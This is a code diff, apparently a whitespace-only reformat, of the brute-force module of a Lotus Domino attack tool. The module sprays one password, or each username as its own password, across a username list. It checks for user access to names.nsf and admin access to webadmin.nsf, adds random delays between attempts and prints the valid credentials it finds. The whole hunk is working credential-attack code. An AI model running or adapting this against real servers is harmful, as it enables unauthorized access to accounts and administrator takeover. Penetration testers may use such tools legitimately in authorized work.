@@ -30,80 +30,80 @@ from .main import DomiOwned
 
 class BruteForce(DomiOwned):
 
-	def bruteforce(self, userlist):
-		"""
-		Perform a reverse brute force attack with multiple usernames and one password.
-		"""
-		if self.auth_type == 'open':
-			self.logger.info("{0}/names.nsf does not require authentication".format(self.url))
-		else:
-			usernames = self.build_userlist(userlist)
-			valid_accounts = self.brute_accounts(usernames)
+    def bruteforce(self, userlist):
+        """
+        Perform a reverse brute force attack with multiple usernames and one password.
+        """
+        if self.auth_type == 'open':
+            self.logger.info("{0}/names.nsf does not require authentication".format(self.url))
+        else:
+            usernames = self.build_userlist(userlist)
+            valid_accounts = self.brute_accounts(usernames)
 
-			print('\n')
-			if valid_accounts:
-				self.logger.info("Found {0} valid {1}".format(len(valid_accounts), inflect.engine().plural('account', len(valid_accounts))))
-				print(tabulate.tabulate(valid_accounts, headers=['Username', 'Password', 'Account Type'], tablefmt='simple'))
-			else:
-				self.logger.warn('No valid accounts found')
+            print('\n')
+            if valid_accounts:
+                self.logger.info("Found {0} valid {1}".format(len(valid_accounts), inflect.engine().plural('account', len(valid_accounts))))
+                print(tabulate.tabulate(valid_accounts, headers=['Username', 'Password', 'Account Type'], tablefmt='simple'))
+            else:
+                self.logger.warn('No valid accounts found')
 
-	def build_userlist(self, userlist):
-		"""
-		Build a list of usernames from the user supplied wordlist.
-		"""
-		if os.path.isfile(userlist):
-			f = open(os.path.abspath(userlist), 'r').read()
-			usernames = f.rstrip().split('\n')
-			return usernames
-		else:
-			self.logger.error('Unable to find username list')
-			sys.exit()
+    def build_userlist(self, userlist):
+        """
+        Build a list of usernames from the user supplied wordlist.
+        """
+        if os.path.isfile(userlist):
+            f = open(os.path.abspath(userlist), 'r').read()
+            usernames = f.rstrip().split('\n')
+            return usernames
+        else:
+            self.logger.error('Unable to find username list')
+            sys.exit()
 
-	def brute_accounts(self, usernames):
-		"""
-		Determine if authentication was successful, and if the account is an administrator.
-		"""
-		valid_accounts = []
+    def brute_accounts(self, usernames):
+        """
+        Determine if authentication was successful, and if the account is an administrator.
+        """
+        valid_accounts = []
 
-		# Setup progress bar
-		progress_bar = self.utilities.setup_progress(len(usernames))
+        # Setup progress bar
+        progress_bar = self.utilities.setup_progress(len(usernames))
 
-		# Check if username should be used as password
-		if self.password == '':
-			user_as_pass = True
-		else:
-			user_as_pass = False
-			password_canidate = self.password
+        # Check if username should be used as password
+        if self.password == '':
+            user_as_pass = True
+        else:
+            user_as_pass = False
+            password_canidate = self.password
 
-		for username in usernames:
-			self.post_data = {}
-			self.session.cookies.clear()
+        for username in usernames:
+            self.post_data = {}
+            self.session.cookies.clear()
 
-			# Set username as password
-			if user_as_pass:
-				password_canidate = username
+            # Set username as password
+            if user_as_pass:
+                password_canidate = username
 
-			try:
-				access = self.check_access(username=username, password=password_canidate)
+            try:
+                access = self.check_access(username=username, password=password_canidate)
 
-				# Check for access to webadmin.nsf
-				if access['webadmin.nsf']:
-					valid_accounts.append([username, password_canidate, 'Admin'])
+                # Check for access to webadmin.nsf
+                if access['webadmin.nsf']:
+                    valid_accounts.append([username, password_canidate, 'Admin'])
 
-					# Administrator access > user access
-					continue
+                    # Administrator access > user access
+                    continue
 
-				# Check for access to names.nsf
-				if access['names.nsf']:
-					valid_accounts.append([username, password_canidate, 'User'])
+                # Check for access to names.nsf
+                if access['names.nsf']:
+                    valid_accounts.append([username, password_canidate, 'User'])
 
-				progress_bar.update(1)
-				time.sleep(random.random())
+                progress_bar.update(1)
+                time.sleep(random.random())
 
-			except KeyboardInterrupt:
-				self.logger.debug('Got Ctrl-C, exiting...')
-				break
+            except KeyboardInterrupt:
+                self.logger.debug('Got Ctrl-C, exiting...')
+                break
 
-		progress_bar.close()
+        progress_bar.close()
 
-		return valid_accounts
+        return valid_accounts
